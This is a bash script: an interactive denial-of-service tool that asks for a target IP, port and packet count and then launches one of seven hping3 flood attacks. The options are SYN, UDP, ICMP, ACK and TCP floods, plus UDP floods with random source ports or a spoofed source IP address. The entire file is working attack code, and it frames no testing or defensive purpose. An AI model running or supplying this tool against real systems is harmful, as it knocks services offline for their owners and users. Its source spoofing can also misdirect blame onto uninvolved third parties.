#!/bin/bash

initialize() {
    if [ "$(id -u)" != "0" ]; then
        echo "This script must be run as root. Exiting."
        exit 1
    fi
    echo "Starting the script..."
}

syn_flood_attack() {
    echo "Performing SYN flood attack on $target_ip:$target_port"
    hping3 $target_ip -p $target_port --syn -c $num_packets > /dev/null &
    show_loading_animation
}

udp_flood_attack() {
    echo "Performing UDP flood attack on $target_ip:$target_port"
    hping3 $target_ip -p $target_port --udp -c $num_packets -d 0 > /dev/null &
    show_loading_animation
}

icmp_flood_attack() {
    echo "Performing ICMP flood attack on $target_ip"
    hping3 $target_ip --icmp -c $num_packets > /dev/null &
    show_loading_animation
}

ack_flood_attack() {
    echo "Performing ACK flood attack on $target_ip:$target_port"
    hping3 $target_ip -p $target_port --ack -c $num_packets > /dev/null &
    show_loading_animation
}

tcp_flood_attack() {
    echo "Performing TCP flood attack on $target_ip:$target_port"
    hping3 $target_ip -p $target_port --tcp -c $num_packets > /dev/null &
    show_loading_animation
}

udp_random_source_attack() {
    echo "Performing UDP flood attack on $target_ip:$target_port with random source ports"
    hping3 $target_ip -p $target_port --udp --rand-source -c $num_packets -d 0 > /dev/null &
    show_loading_animation
}

udp_spoofed_source_attack() {
    echo "Performing UDP flood attack on $target_ip:$target_port with spoofed source IP"
    hping3 $target_ip -p $target_port --udp --spoof $spoofed_ip -c $num_packets -d 0 > /dev/null &
    show_loading_animation
}

show_loading_animation() {
    spin='-\|/'
    i=0
    while kill -0 $! 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "\r${spin:$i:1} Attacking..."
        sleep .1
    done
    echo "Attack completed."
}

get_num_packets() {
    read -p "Enter the number of packets to send: " num_packets_input
    num_packets=$num_packets_input
}

initialize

read -p "Enter the target IP address: " target_ip
read -p "Enter the target port: " target_port

get_num_packets

echo "Select an attack type:"
echo "1. SYN Flood Attack"
echo "2. UDP Flood Attack"
echo "3. ICMP Flood Attack"
echo "4. ACK Flood Attack"
echo "5. TCP Flood Attack"
echo "6. UDP Flood Attack with Random Source Ports"
echo "7. UDP Flood Attack with Spoofed Source IP"

read -p "Enter your choice: " choice

case $choice in
    1)
        syn_flood_attack
        ;;
    2)
        udp_flood_attack
        ;;
    3)
        icmp_flood_attack
        ;;
    4)
        ack_flood_attack
        ;;
    5)
        tcp_flood_attack
        ;;
    6)
        udp_random_source_attack
        ;;
    7)
        read -p "Enter the spoofed source IP address: " spoofed_ip
        udp_spoofed_source_attack
        ;;
    *)
        echo "Invalid choice. Exiting."
        ;;
esac
